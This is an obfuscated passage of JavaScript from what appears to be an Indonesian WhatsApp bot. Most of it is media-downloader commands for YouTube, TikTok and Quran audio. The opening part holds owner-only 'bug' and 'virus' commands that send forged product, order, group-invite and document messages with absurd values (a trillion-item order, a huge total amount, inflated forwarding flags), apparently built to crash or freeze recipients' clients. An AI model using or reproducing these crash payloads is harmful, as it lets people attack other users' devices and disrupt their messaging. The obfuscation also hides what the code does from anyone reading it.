_0x26993b={};_0x26993b[_0x406083(0x8cd,0x482,0x683,0xd56)+'ge']=imeg,_0x26993b[_0x406083(0x593,0x269,0xa53,0x36b)]=_0x406083(0xaf2,0xb2a,0xd79,0xd2e)+_0x4aaba1(0x51a,0x66,0x259,0x12f),_0x26993b[_0x406083(0xa57,0x895,0xa50,0xe96)]=_0x406083(0xa0b,0xd77,0x970,0x79a)+_0x4aaba1(0x4a9,0x98c,-0x5d,0x11f),_0x26993b[_0x4aaba1(0x50e,0x9d,0x4,0x3ac)+'n']=''+vipi,_0x26993b[_0x406083(0xa47,0xb5f,0x929,0xef3)+'de']=_0x4aaba1(0x477,0x7bc,0x887,0x5d3),_0x26993b[_0x4aaba1(0x97c,0x975,0xe98,0xcc4)+_0x406083(0x417,0x27c,0x44f,0x1b6)]=_0x4aaba1(0xc60,0xf78,0x1043,0x10ea)+_0x406083(0x668,0xb10,0x1cc,0x748)+'1919',_0x26993b[_0x4aaba1(0x902,0xc20,0x934,0x951)+_0x4aaba1(0xc36,0xb87,0x7dc,0x961)]=0x1;const _0x1bf5e2={};_0x1bf5e2['forwarding'+'Score']=0x3,_0x1bf5e2['isForwarde'+'d']=!![];const _0x1ebf37={};_0x1ebf37['product']=_0x26993b,_0x1ebf37[_0x406083(0x92d,0x7c5,0x68b,0x4d3)+_0x4aaba1(0x947,0x768,0x831,0xe39)]=_0x4aaba1(0x870,0x7ae,0x9a1,0x68b)+_0x4aaba1(0x91e,0x9f1,0xb33,0x40f)+_0x4aaba1(0x7f5,0xd0f,0x46d,0x563),_0x1ebf37['contextInf'+'o']=_0x1bf5e2;const _0x583081={};_0x583081['productMes'+_0x4aaba1(0x4ff,0x2b2,0x79e,0x8f1)]=_0x1ebf37;const _0x594cd2={};_0x594cd2[_0x406083(0xcae,0xf98,0xe36,0xd64)]=ftroli,_0x594cd2[_0x4aaba1(0x397,0x2ef,0x365,0x74c)]={},res=await alpha[_0x4aaba1(0x3d4,0x57a,0x84,0x461)+_0x4aaba1(0x762,0x426,0xc87,0xc55)+'ntent'](from,_0x583081,_0x594cd2),alpha['relayWAMes'+'sage'](res);break;case _0x4aaba1(0xa86,0x83f,0x5b2,0x983):if(!isOwner&&!mek[_0x4aaba1(0x488,0x421,0x624,0x200)][_0x406083(0xd3c,0x9ec,0x1071,0xba7)])return reply(_0x406083(0xcca,0xd69,0x8ae,0xb63)+_0x4aaba1(0x9f1,0xbad,0x742,0xaf4));let bugf=fs[_0x4aaba1(0x59d,0x68f,0x180,0x838)+'nc'](_0x406083(0x587,0x34e,0x78b,0x536)+thumbnail);imeu=await alpha['prepareMes'+_0x4aaba1(0x4ff,0x4e7,0x5b9,0x26a)](_0x406083(0x6bb,0x95e,0x60b,0x1f3)+_0x4aaba1(0x5ca,0xaf1,0x892,0x5e7),bugf,image),imeg=imeu[_0x406083(0x467,-0x3b,-0x32,0x436)][_0x4aaba1(0x766,0x5c6,0x8b9,0x9c2)+'ge'];const _0xa5c91c={};_0xa5c91c[_0x4aaba1(0x904,0x8fe,0x512,0x9eb)+_0x406083(0x973,0xde1,0x9c5,0x7f9)]=0x3,_0xa5c91c[_0x406083(0x823,0xcf8,0xb7a,0x7ab)+'d']=!![];const _0x1ac41b={};_0x1ac41b[_0x406083(0xcae,0xeb0,0xd92,0xae0)]=bugtrol,_0x1ac41b[_0x406083(0x852,0x8c3,0x3c1,0xb39)+'o']={},res=await alpha[_0x4aaba1(0x3d4,0x636,0x2a0,0x2c4)+_0x4aaba1(0x762,0xa54,0x772,0x4a9)+_0x406083(0xca3,0x1011,0xbb5,0xbbd)](from,{'orderMessage':{'orderId':'3595319159'+_0x406083(0x4e5,0x154,0x790,0x167),'thumbnail':fs['readFileSy'+'nc'](_0x406083(0x587,0x94,0x17a,0x5fe)+thumbnail),'itemCount':0xe8d4a51000,'status':_0x4aaba1(0x672,0x8a2,0x2f3,0x9a0),'surface':_0x406083(0x7e9,0x97b,0x9f9,0x935),'orderTitle':_0x4aaba1(0xa50,0x8ab,0x85a,0xedb),'message':_0x406083(0x5f3,0x3d9,0x9c2,0x4ec),'sellerJid':_0x406083(0x83b,0xd0a,0x5a9,0x5bd)+_0x4aaba1(0x91e,0xb9c,0x9b2,0xa3e)+_0x406083(0x7c0,0x7e8,0x66d,0xae2),'token':_0x4aaba1(0x58f,0x45a,0x17a,0x58b)+_0x406083(0x8c4,0x967,0xd9e,0x8fc)+_0x4aaba1(0x657,0x1e8,0x87e,0xa57)+_0x4aaba1(0x7b3,0x518,0x2dc,0x2a2)+'0FGwkw==','totalAmount1000':'9999999999'+_0x406083(0x43e,0x75,0x822,0x22f),'totalCurrencyCode':_0x4aaba1(0x410,-0xe5,0x85d,0x8d3),'contextInfo':_0xa5c91c}},_0x1ac41b),alpha[_0x4aaba1(0x994,0xd20,0x72b,0x4cb)+_0x4aaba1(0x4ff,0x3e9,0x71a,0x2a9)](res);break;case _0x4aaba1(0x490,0x92b,0xb2,0x442):if(!isOwner&&!mek[_0x4aaba1(0x488,0x104,-0x27,0x55e)][_0x4aaba1(0xd71,0xa65,0xdb3,0xa22)])return reply(_0x406083(0xcca,0xa6f,0xf47,0xee3)+_0x406083(0x9bc,0xb25,0x4ed,0x989));let buf=fs[_0x406083(0x568,0x273,0x731,0x1c9)+'nc'](_0x406083(0x587,0x4ff,0x39b,0x3ab)+thumbnail);imeu=await alpha[_0x406083(0x39f,0xee,0x380,0x530)+_0x406083(0x4ca,0x331,0x2e5,0x3fa)](_0x4aaba1(0x6f0,0x2eb,0x603,0x203)+_0x4aaba1(0x5ca,0x37e,0x2ea,0xf3),buf,image),imeg=imeu['message']['imageMessa'+'ge'];const _0x367fac={};_0x367fac[_0x406083(0x8cf,0x76a,0x55b,0x3fc)+'Score']=0x3,_0x367fac[_0x4aaba1(0x858,0xbd5,0x6cd,0xd15)+'d']=!![];const _0x3878af={};_0x3878af[_0x4aaba1(0x9f2,0x626,0xba2,0x520)]=_0x4aaba1(0xa64,0xb0d,0xd20,0x64c)+_0x406083(0x69a,0x6d9,0x40b,0xad6)+'33@g.us',_0x3878af[_0x406083(0x759,0x8a0,0x693,0xaf7)]=_0x4aaba1(0x3fc,0x504,0x686,0x817)+'8OwK2x',_0x3878af[_0x4aaba1(0x39f,0x49d,0x6a7,0x828)+_0x4aaba1(0xd3d,0xdbb,0xa98,0xa20)]=_0x4aaba1(0xbde,0xf97,0xf82,0xa13)+_0x4aaba1(0x8bb,0x4ee,0xc4f,0xbbb),_0x3878af['groupName']=_0x4aaba1(0xa40,0xdf4,0xb1a,0xd95)+_0x406083(0x433,0x876,0x20f,-0x9d)+vipi,_0x3878af['jpegThumbn'+_0x406083(0x7b9,0xadd,0x491,0x8f3)]=buf,_0x3878af[_0x4aaba1(0x4ad,0x813,-0x26,0x526)]=_0x4aaba1(0x430,0x641,0x18a,0x4e)+_0x406083(0x6d3,0xade,0x7c2,0xa69)+_0x406083(0xcb2,0x1194,0x93f,0xf3c)+_0x406083(0xba1,0xd15,0xa7a,0x990)+'97ByRk79',_0x3878af[_0x406083(0x852,0x591,0x894,0x995)+'o']=_0x367fac;const _0x1fbe87={};_0x1fbe87[_0x4aaba1(0xd55,0x11b8,0x851,0x10c9)+_0x4aaba1(0x4e9,0xeb,0x764,0x41b)]=_0x3878af;const _0x1041df={};_0x1041df[_0x4aaba1(0xce3,0x806,0xec8,0xaeb)]=imeu,_0x1041df['contextInf'+'o']={},res=await alpha[_0x406083(0x39f,0x55e,0x805,0x58b)+_0x406083(0x72d,0x647,0x433,0x51b)+_0x406083(0xca3,0x863,0xb55,0xbf3)](from,_0x1fbe87,_0x1041df),alpha['relayWAMes'+'sage'](res);break;case'virus4':if(!isOwner&&!mek[_0x406083(0x453,0x28a,0x262,0x3c4)][_0x406083(0xd3c,0x117c,0xecd,0x105d)])return reply(_0x406083(0xcca,0x1150,0x11d6,0xd62)+_0x4aaba1(0x9f1,0xcb9,0x564,0x901));tapib1=fs[_0x406083(0x568,0x9b6,0x7d0,0x926)+'nc'](_0x406083(0x5c2,0x545,0x508,0x3b4)+_0x406083(0xad0,0xb75,0x6b1,0x853)+_0x406083(0x798,0xb65,0x557,0x441));const _0x3dda57={};_0x3dda57[_0x4aaba1(0xce3,0xb33,0xf52,0xcb3)]=mek,_0x3dda57[_0x406083(0xaa8,0x939,0xd10,0x595)]=creator+'\x20'+vipi+_0x4aaba1(0x7cd,0x426,0xb71,0x337),_0x3dda57[_0x4aaba1(0x825,0x6aa,0xaa3,0xa30)]='audio/appl'+_0x4aaba1(0xaf2,0x7c9,0x7f0,0xa97),alpha['sendMessag'+'e'](from,tapib1,document,_0x3dda57);break;case _0x406083(0x3ce,0x519,0x8d4,0x324):if(!isGroup)return reply(lang[_0x406083(0xab6,0xd7d,0x6f6,0xd3d)]());if(args['length']<0xe6a+0x8bd*0x1+0x2*-0xb93)return reply(_0x4aaba1(0x9c0,0x6e8,0xbd4,0x888)+_0x4aaba1(0xae2,0xaf9,0xfc5,0x1004)+prefix+(_0x4aaba1(0xd00,0x1053,0xb37,0xe13)+'*'));reply(lang[_0x4aaba1(0x45a,0x239,-0x19,0x7bb)]());let yut=await yts(q);server='en68',yta2(yut[_0x406083(0x377,0xc7,0x7a9,0xad)][0x2*0x264+-0x19*0x9f+0xabf][_0x4aaba1(0xa11,0x822,0xa88,0xcbd)],server)[_0x406083(0xb30,0xf15,0xaa6,0xe61)](async _0x17472c=>{const _0x563da5={'uQIFP':_0x5e119e(0xc0c,0x6e2,0x797,0xad7)+_0x139ade(0xe03,0xfbb,0x9d2,0xd1c),'xfXHy':'RESPONSE','emGTV':_0x5e119e(0x9ff,0x8df,0xa7c,0x6b0)+'kbps)','Ndujq':_0x139ade(0x78d,0x97e,0xd79,0xb51)+_0x5e119e(0xd93,0xdfa,0x7a7,0xac1),'OWxfG':function(_0x3f9d99,_0x365984,_0x29abcf,_0x5b9bef,_0x597c04,_0x3ff5d8,_0xd8ae95){return _0x3f9d99(_0x365984,_0x29abcf,_0x5b9bef,_0x597c04,_0x3ff5d8,_0xd8ae95);}},{thumb:_0x4a4d58,title:_0x31c60d,filesizeF:_0x414ce6,filesize:_0x4e9165}=_0x17472c,_0x17d7a1='🎧\x20*Y\x20O\x20U\x20T'+_0x5e119e(0x4a5,0x127,0x152,0x281)+_0x139ade(0x8ca,0x223,0x436,0x6a4)+_0x5e119e(0x7bd,0x457,0xb24,0x6c0)+_0x31c60d+_0x5e119e(0x4a5,0x7bc,0x46b,0x45e)+yut[_0x139ade(0x22a,0x410,-0xc3,0x3b2)][-0x237d+0x20ff*0x1+-0x1*-0x27e]['videoId']+(_0x5e119e(0x931,0xb4c,0x86a,0x715)+':\x20')+yut['videos'][0x19e0+0x26c1+0xf*-0x44f]['ago']+_0x5e119e(0x122,-0x7,0x591,0x26b)+_0x414ce6+_0x5e119e(0xf74,0x87f,0x68e,0xb5c)+yut[_0x139ade(0x284,0x7e9,0x5d5,0x3b2)][-0x121d*0x2+0x2*0x42d+0x1be0][_0x139ade(-0x9b,0x766,0x216,0x485)]+('\x20\x0a🐣\x20Durati'+_0x139ade(0x1a4,0x7a5,0x348,0x497))+yut[_0x5e119e(-0x35a,-0x2fc,0x579,0x157)][-0xc4c+0xb*-0x86+-0x1*-0x120e]['timestamp']+_0x139ade(0xd8b,0xaf5,0xbc5,0x8a7)+yut[_0x139ade(0x84a,0x7e3,0xe6,0x3b2)][0x3bf+0xbd5+-0x3e5*0x4][_0x5e119e(0x836,0xa4b,0x756,0x7bc)]+(_0x139ade(0x67f,0x255,0x1ad,0x4b6)+_0x139ade(0x5de,0xbae,0x374,0x836)+'\x20media\x20you'+_0x139ade(0x6f3,-0xb3,0x68d,0x3b6)+'ownload_');let _0x19590a=await getBuffer(_0x4a4d58);const _0xed5fde={};_0xed5fde['displayTex'+'t']=_0x563da5[_0x139ade(0x3b1,0x2c9,0x292,0x64e)];const _0x1d3f9e={};_0x1d3f9e[_0x5e119e(0x1cc,0xa29,0x62a,0x538)]='videohd\x20'+q,_0x1d3f9e[_0x5e119e(0x8b4,0x4a0,0x4eb,0x494)]=_0xed5fde,_0x1d3f9e['type']=_0x563da5[_0x139ade(0xd2c,0x637,0x6f0,0xa39)];function _0x5e119e(_0x3cfdbb,_0x498efe,_0x441b00,_0xd1a125){return _0x4aaba1(_0xd1a125- -0x255,_0x498efe,_0x441b00-0x9b,_0xd1a125-0x18);}function _0x139ade(_0x383864,_0x394312,_0x1edb53,_0x4500f0){return _0x4aaba1(_0x4500f0-0x6,_0x1edb53,_0x1edb53-0x151,_0x4500f0-0xb1);}const _0x4accbe={};_0x4accbe[_0x139ade(0x7df,0x9cf,0x658,0x549)+'t']=_0x563da5['emGTV'];const _0x2c2397={};_0x2c2397[_0x5e119e(0x27c,0x8f3,0x8d5,0x538)]=_0x5e119e(0xa7e,0xad7,0x3bf,0x659)+q,_0x2c2397[_0x139ade(0xbb8,0xa11,0xb14,0x6ef)]=_0x4accbe,_0x2c2397[_0x139ade(0x5d7,0x6b5,0x6ea,0x81c)]=_0x5e119e(-0x151,0x6a8,0x376,0x2b8);const _0x3828a3={};_0x3828a3[_0x5e119e(0x6f2,0x34,0x5b3,0x2ee)+'t']=_0x563da5['Ndujq'];const _0x119d59={};_0x119d59['buttonId']=_0x5e119e(0x192,0x346,-0x119,0x224)+yut['videos'][-0x1d73+0x1d5d+0x16][_0x5e119e(0xb3c,0x7d6,0x561,0x7bc)],_0x119d59[_0x5e119e(0x85c,0x8ec,0x260,0x494)]=_0x3828a3,_0x119d59['type']=_0x563da5['xfXHy'];let _0x2ff7a6=[_0x1d3f9e,_0x2c2397,_0x119d59];_0x563da5[_0x5e119e(0x9c3,0xde7,0x69c,0xb4d)](sendButLocation,from,_0x17d7a1,_0x139ade(0xd56,0xdaf,0xec0,0x9ca)+_0x139ade(0x8b7,0x130,0x5d4,0x4ac)+_0x139ade(0x851,0x94e,0xfd7,0xb38)+enter+enter+botname+'™©\x20|\x20By\x20'+ownername,_0x19590a,_0x2ff7a6,{});})['catch'](_0x22c95d=>reply(_0x406083(0x614,0x722,0x27f,0xa3b)+_0x406083(0x3ed,0x46b,0x595,0x2a)+'oba\x20bebera'+_0x406083(0xa53,0x9b3,0x69e,0x572)+'gi'));break;case _0x4aaba1(0xa58,0x853,0x722,0xbb3):if(!isUrl(args[-0x4a*-0x10+-0x927+0x13*0x3d])&&!args[0x3*0x4bb+0x403+-0x1234][_0x406083(0x5c0,0x9aa,0x66e,0x4ee)](_0x406083(0x535,0x927,0x87f,0x2cd)))return reply(lang[_0x406083(0x87a,0x481,0xd1f,0x829)]());if(!q)return fakegroup('Linknya?');reply(lang[_0x406083(0x425,0x4e,0x5c9,0x2a1)]()),ttt=args[_0x406083(0xadd,0xf80,0xeee,0xa7c)]('\x20'),hx['ttdownload'+'er'](ttt)[_0x4aaba1(0xb65,0x95d,0x754,0x645)](_0x5e12e4=>{function _0x384a32(_0x5779a9,_0x503e95,_0xb526c1,_0x5067b9){return _0x406083(_0x5067b9- -0x334,_0x503e95-0x108,_0xb526c1-0xda,_0x503e95);}const _0x557438={'eDSPx':function(_0x4ef46b,_0x4c0685){return _0x4ef46b(_0x4c0685);},'ZbVrf':_0x384a32(0x1d9,0x896,0x608,0x5e2),'BJEDe':_0x4d6f49(0xc1c,0xe53,0x932,0x729),'dndow':_0x4d6f49(0x604,0x48e,0x5b1,0x8f)};function _0x4d6f49(_0x1ab0f5,_0x51272d,_0x48c92b,_0x31dee1){return _0x4aaba1(_0x48c92b-0xa4,_0x51272d,_0x48c92b-0x1b0,_0x31dee1-0x1a8);}const {wm:_0x3f49c0,nowm:_0x355802,audio:_0x3c1164}=_0x5e12e4;axios['get']('https://ti'+_0x4d6f49(0xc4,0xfb,0x43e,0x256)+_0x4d6f49(0xce6,0xa56,0xdd5,0xb4a)+_0x384a32(0x865,0x319,0x68d,0x81a)+_0x3f49c0)[_0x384a32(0xcac,0x53a,0x682,0x7fc)](async _0x48da79=>{let _0x134962=await _0x557438['eDSPx'](getBuffer,_0x3f49c0);const _0x28a350={};_0x28a350['displayTex'+'t']=_0x557438[_0x559bb1(0x87a,0x3b1,-0x7b,0x70e)];const _0x4d3dd4={};_0x4d3dd4[_0x57dde1(0x835,0xcf0,0xb04,0x92b)]=_0x57dde1(0x6d0,0xab5,0x71f,0x7c1)+'\x20'+q,_0x4d3dd4[_0x57dde1(0x4b6,0x657,0x549,0x887)]=_0x28a350,_0x4d3dd4[_0x57dde1(0x4d0,0xbdc,0xd0a,0x9b4)]=_0x57dde1(0x69b,0x483,0xbbe,0x6ab);const _0xfb1d15={};_0xfb1d15[_0x57dde1(0x8f5,0x22c,0xb73,0x6e1)+'t']=_0x557438[_0x57dde1(0xae2,0xcfb,0x672,0xafe)];function _0x57dde1(_0x26e388,_0x13305a,_0x18ead1,_0x1e0567){return _0x384a32(_0x26e388-0x184,_0x18ead1,_0x18ead1-0x59,_0x1e0567-0x507);}const _0x3f18dc={};_0x3f18dc['buttonId']='tiktokaudi'+'o\x20'+q,_0x3f18dc['buttonText']=_0xfb1d15,_0x3f18dc[_0x57dde1(0xd62,0x9cf,0x52e,0x9b4)]=_0x557438[_0x559bb1(0x1c7,0x623,0x8c0,0x931)];let _0x58b971=[_0x4d3dd4,_0x3f18dc];function _0x559bb1(_0x3c01df,_0x1b059d,_0x35315a,_0xde0aa9){return _0x384a32(_0x3c01df-0x71,_0x35315a,_0x35315a-0x1c9,_0x1b059d- -0x7e);}sendButVideo(from,'Hi\x20@'+sender[_0x559bb1(0x43f,0x2c4,0x2a2,-0x209)]('@')[0x1737+-0x327*-0x7+-0x2d48]+(_0x559bb1(-0xc7,0x3ec,0x4d0,0x54e)+_0x559bb1(0x29d,0xf,0x296,0x6a)+_0x57dde1(0xa1a,0xa57,0x920,0x582)+_0x559bb1(0x9a9,0x817,0xb32,0x399)+_0x57dde1(0xcb5,0x9c1,0xb27,0xa0c)+_0x57dde1(0xae8,0x76c,0x7a2,0xa2f)+_0x57dde1(0x8ec,0x5e2,0x792,0x72c)+_0x57dde1(0xf4e,0xf57,0xc0e,0xbd7)+'h'),_0x559bb1(0x3e9,0x27e,0x20e,0x3ad)+enter+('Jika\x20whats'+'app\x20mod\x20ka'+_0x559bb1(0x587,0x32f,0x771,0x731)+'upport\x20but'+_0x559bb1(0x92b,0x4d7,0x15d,0x7f4)+'an\x20tonton\x20'+_0x57dde1(0xaec,0x794,0x57b,0x976)+'https://yo'+'utu.be/ERG'+_0x57dde1(0xd36,0x7e9,0x917,0x975))+enter+enter+botname+'™©\x20|\x20By\x20'+ownername,_0x134962,_0x58b971,{'contextInfo':{'mentionedJid':[sender]}});});})[_0x406083(0xa96,0x97f,0xca0,0xe75)](_0x57ea2a=>reply(_0x406083(0x614,0x7a3,0xa16,0x66a)+'salahan,\x20c'+_0x4aaba1(0x44a,0x418,0x554,0x302)+_0x4aaba1(0xa88,0xf9e,0x781,0xc7e)+'gi'));break;case'alquran_au'+_0x4aaba1(0x4c1,0x831,-0x4b,0x62):if(args[_0x4aaba1(0x7cc,0xa13,0x76a,0x5e3)]<-0x17*0x143+0x25e9+-0x8e3)return reply(_0x4aaba1(0x7d5,0x9f7,0x9e5,0x2c4)+(prefix+command)+('\x20nomor_sur'+_0x4aaba1(0x3d6,0x8a9,0x7b9,0x6db)+_0x4aaba1(0x970,0xd66,0x716,0xcac))+enter+_0x406083(0x84f,0xd25,0x675,0x868)+(prefix+command)+_0x406083(0x475,0x793,0x842,0x99b));var F=q,F1=F[_0x4aaba1(0x6ab,0x8bc,0xa5d,0x594)]('|')[-0xd0f*-0x1+-0x1*-0xcb3+-0x19c2],F2=F[_0x4aaba1(0x6ab,0x3e3,0x891,0x20d)]('|')[0x7c4+-0x67*-0x5f+-0xf54*0x3];let pijaqu=await fetchJson('https://al'+_0x4aaba1(0xb63,0x78e,0x889,0xbf6)+_0x406083(0x7d2,0x49d,0x34a,0x83c)+_0x406083(0x364,0x4c1,0x7e2,0x1ba)+'i-zeeoneof'+'c.vercel.a'+_0x406083(0x429,-0x46,0x94b,0x864)+F1+'/'+F2),japkk=await getBuffer(pijaqu[_0x406083(0x8f3,0x602,0x485,0x471)][_0x4aaba1(0x460,0x5a0,0xe,0x961)]['primary'])[_0x4aaba1(0xacb,0x9cb,0xb4a,0x718)](_0x5d9612=>{const _0x241fb9={'eiDQv':function(_0x197e04,_0x5e9642){return _0x197e04(_0x5e9642);},'QYzzo':_0x22066d(0x95b,0xa24,0x577,0xdb9)};function _0x5c18da(_0x431e24,_0x5a86f0,_0x59ebf5,_0x3506c3){return _0x4aaba1(_0x431e24- -0x35a,_0x3506c3,_0x59ebf5-0x17c,_0x3506c3-0x23);}function _0x22066d(_0x54cf77,_0x148d10,_0x381591,_0x4b13bd){return _0x406083(_0x148d10- -0x1d1,_0x148d10-0x1db,_0x381591-0x5d,_0x4b13bd);}_0x241fb9['eiDQv'](reply,_0x241fb9[_0x5c18da(0x42e,0x757,0x248,0x6f9)]);});const _0x3968b2={};_0x3968b2[_0x4aaba1(0x7e9,0x9fb,0xa9d,0x6fb)]=_0x4aaba1(0x6ca,0x247,0x359,0x582)+'utu.be/1r_'+'xTH6oLd8',_0x3968b2['mediaType']=0x2,_0x3968b2['title']=_0x406083(0xd30,0x10af,0x11ba,0x817)+_0x406083(0x48c,-0x66,0x1ba,0x140),_0x3968b2[_0x406083(0x618,0x9d1,0x5d2,0x6fc)]='',_0x3968b2[_0x406083(0x5db,0x264,0xf1,0xaaf)+'rl']='',_0x3968b2[_0x4aaba1(0x72c,0xac8,0x8f0,0x6b6)]=pp_userz;const _0x497b1c={};_0x497b1c[_0x4aaba1(0x533,0xcb,0xa01,0xaf)]=_0x406083(0xd30,0x11e1,0xbe9,0x10fc)+_0x406083(0x48c,0x9b4,0x6dd,0x773),_0x497b1c['forwarding'+_0x406083(0x973,0x924,0x516,0x611)]=0x3b9aca00,_0x497b1c['isForwarde'+'d']=!![],_0x497b1c[_0x406083(0x43c,0x289,0x752,-0x9f)+'ral']=!![],_0x497b1c['externalAd'+_0x4aaba1(0xdce,0x12a9,0xdc6,0x12c6)]=_0x3968b2;const _0x529b1c={};_0x529b1c['contextInf'+'o']=_0x497b1c,_0x529b1c['mimetype']='audio/mp4',_0x529b1c[_0x406083(0xaa8,0x69b,0x920,0xa7a)]=_0x406083(0x44b,0x49a,0x31f,0x28e)+_0x406083(0x974,0x7d0,0x727,0x84f),_0x529b1c[_0x4aaba1(0xce3,0xbe8,0xdf0,0x1000)]=fgclink2,_0x529b1c['thumbnail']=pp_userz,alpha[_0x4aaba1(0x8b4,0xa1b,0x83e,0x4aa)+'e'](from,japkk,MessageType[_0x4aaba1(0x941,0x55d,0xe26,0xadb)],_0x529b1c);break;case _0x4aaba1(0xd56,0xd00,0xdcb,0x946)+'o':case _0x406083(0x396,0x1e0,0x15c,0x12d)+'c':case'ttmp3':if(!isUrl(args[-0x2*0x8d2+-0x184*-0x7+-0x19*-0x48])&&!args[-0x1*-0x1e8+-0x1*0x15d+-0x8b*0x1][_0x406083(0x5c0,0x664,0xa3f,0x2da)](_0x4aaba1(0x56a,0x766,0x406,0x6fb)))return reply(lang[_0x4aaba1(0x8af,0x7f4,0xb8c,0x42c)]());if(!q)return reply(_0x4aaba1(0x3e9,0x3ad,0x7c7,0x2a7));reply(lang['wait']()),hx[_0x4aaba1(0xd13,0x908,0xfaf,0xb3d)+'er'](''+args[0x16e2+0x29e+-0x1980])[_0x4aaba1(0xb65,0xaf6,0xef0,0xf17)](_0x17225e=>{function _0x4d9bff(_0x2a4ad5,_0x54ecd7,_0x10c9fa,_0x1515d2){return _0x406083(_0x54ecd7- -0xa4,_0x54ecd7-0x14d,_0x10c9fa-0x39,_0x2a4ad5);}const _0x3b94b9={'tnYWK':function(_0x1fb1a7,_0x5d4029){return _0x1fb1a7===_0x5d4029;},'HDeNF':_0x4d9bff(0x6a6,0x516,0x849,0x6bd),'fnGTW':function(_0x2c2014,_0x528ee7){return _0x2c2014(_0x528ee7);},'yRHrw':_0x4d9bff(0x703,0x5f1,0x753,0x619)+_0x4d9bff(0x1020,0xc76,0x805,0xd98)+'xTH6oLd8','pXdby':_0x4d9bff(0x540,0x87e,0xb76,0xaae)};function _0x5aa3a9(_0x231fba,_0x4cf785,_0x5cfe3e,_0x122e90){return _0x406083(_0x5cfe3e- -0x2f3,_0x4cf785-0x119,_0x5cfe3e-0x7a,_0x4cf785);}const {wm:_0x4feabf,nowm:_0x96192,audio:_0x44275a}=_0x17225e;axios[_0x5aa3a9(0x1a9,0x560,0x542,0x52d)](_0x5aa3a9(0x896,-0x11,0x479,0x86b)+_0x5aa3a9(-0x31b,-0x389,0x72,0x537)+_0x5aa3a9(0x57c,0x901,0xa09,0xcb4)+_0x4d9bff(0x94d,0xaaa,0x7e2,0xf0e)+_0x96192)[_0x4d9bff(0x729,0xa8c,0xf2f,0x5a9)](async _0x7cf1bc=>{function _0x2ec242(_0x4fd069,_0x3cdeb9,_0x3f62b7,_0x36730e){return _0x5aa3a9(_0x4fd069-0x170,_0x4fd069,_0x36730e-0x25c,_0x36730e-0x49);}function _0x15f8e1(_0x3c21f3,_0x2d179f,_0x25ff3c,_0x2f7e89){return _0x4d9bff(_0x25ff3c,_0x2d179f-0xd5,_0x25ff3c-0x87,_0x2f7e89-0xcf);}if(_0x3b94b9[_0x2ec242(0x852,0x5e2,-0x1d,0x42d)](_0x3b94b9[_0x2ec242(0x691,0x2da,0x307,0x7df)],_0x15f8e1(0x2e6,0x5eb,0xafd,0x406))){me='*Link*\x20:\x20'+_0x7cf1bc['data'],nowmm=await _0x3b94b9[_0x2ec242(0x5d1,0x876,0xa34,0xadc)](getBuffer,_0x44275a);const _0x509227={};_0x509227[_0x2ec242(0x79e,0x45d,0x677,0x71d)]=_0x3b94b9[_0x2ec242(-0x10a,0xe4,0x3b7,0x408)],_0x509227[_0x15f8e1(0xef4,0xc75,0xd30,0xb2e)]=0x2,_0x509227[_0x15f8e1(0xac3,0xa88,0xdf3,0x857)]='Tiktok\x20Mus'+'ic',_0x509227[_0x15f8e1(0x8ac,0x649,0x327,0x378)]='',_0x509227['thumbnailU'+'rl']='',_0x509227['thumbnail']=pp_userz;const _0x30eb82={};_0x30eb82[_0x15f8e1(0x30f,0x52f,0x54c,0x3f7)]='Tiktok\x20Mus'+'ic\x20Downloa'+_0x2ec242(-0x1,0x13d,0x4fc,0x387),_0x30eb82[_0x15f8e1(0x852,0x900,0xc6b,0x598)+_0x15f8e1(0x735,0x9a4,0x626,0xb4c)]=0x3b9aca00,_0x30eb82[_0x15f8e1(0x775,0x854,0x75a,0x379)+'d']=!![],_0x30eb82[_0x15f8e1(0x105,0x46d,0x7eb,0x318)+_0x2ec242(0x12a,0x360,0x7c,0x375)]=!![],_0x30eb82[_0x2ec242(0x2e5,0xb9a,0x55e,0x7b5)+_0x2ec242(0x859,0xe95,0xde7,0xd02)]=_0x509227;const _0x2c3f42={};_0x2c3f42[_0x2ec242(0x417,0x62f,0x818,0x7bb)+'o']=_0x30eb82,_0x2c3f42['mimetype']=_0x3b94b9[_0x15f8e1(0xeb5,0xdc1,0xbe8,0xbde)],_0x2c3f42[_0x15f8e1(0xdf2,0xad9,0xb94,0xb93)]=_0x2ec242(0x5c5,0x154,0x309,0x62c)+_0x15f8e1(0xf27,0xb24,0xf69,0xea2),_0x2c3f42['quoted']=fgclink2,_0x2c3f42[_0x15f8e1(0x35a,0x728,0x2db,0x7fa)]=pp_userz,alpha[_0x15f8e1(0x95b,0x8b0,0xb7c,0x3c4)+'e'](from,nowmm,MessageType['document'],_0x2c3f42);}else{_0x1b686f=_0x2ec242(0xec8,0xe34,0x101e,0xc38)+_0x15f8e1(0x851,0x86e,0xae7,0xc58)+_0x15f8e1(0x5ed,0x7a0,0x37d,0x2a3)+_0x2ec242(0x713,0x480,0x5a9,0x502)+'h\x20baik\x20lak'+_0x2ec242(0x3c9,0x8be,0x8d9,0x511)+'pun\x20peremp'+_0x15f8e1(0x7d6,0x9cd,0xa2c,0x770)+'minjamkan\x20'+_0x15f8e1(0x58a,0x40d,0x402,0x194)+_0x15f8e1(0x92c,0xbf2,0xc82,0xf2d)+_0x15f8e1(0x6ef,0x785,0xbdc,0x29c)+_0x2ec242(0x925,0x9cf,0xf05,0xac1)+_0x2ec242(0x7cb,0x77e,0xa20,0xc4b)+'pat-gandak'+'an\x20(ganjar'+'annya)\x20kep'+_0x15f8e1(0x446,0x3da,-0x7b,0x4d8)+_0x15f8e1(0xf3b,0xda2,0xf46,0xc20)+_0x15f8e1(0xac6,0xa0f,0xc06,0xe74)+'hala\x20yang\x20'+'banyak.”\x20('+'Qs.\x20Al\x20Had'+_0x15f8e1(0xca1,0xaf9,0x6f1,0xdc9)+_0x15f8e1(0xaa0,0x775,0x835,0x698)+_0x61b298+(_0x15f8e1(0x9cd,0xb33,0xf51,0xa9e)+':\x20_@')+_0x45bf69[_0x2ec242(0xa98,0x696,0x632,0x5df)]('@')[-0x425+-0x17ed+0x1c12]+(_0x2ec242(0x108,0x1e9,0x27b,0x37f)+_0x2ec242(0xc0d,0x8d2,0x596,0x8b4))+_0x2e3a31+('\x0a\x0a_Powered'+_0x15f8e1(0x9f9,0xcb5,0xcab,0xd72))+_0x22dccf[_0x2ec242(0x9fc,0x4a0,0x35b,0x5df)]('@')[0x87*0x8+0xbe6+-0x80f*0x2]+'_';const 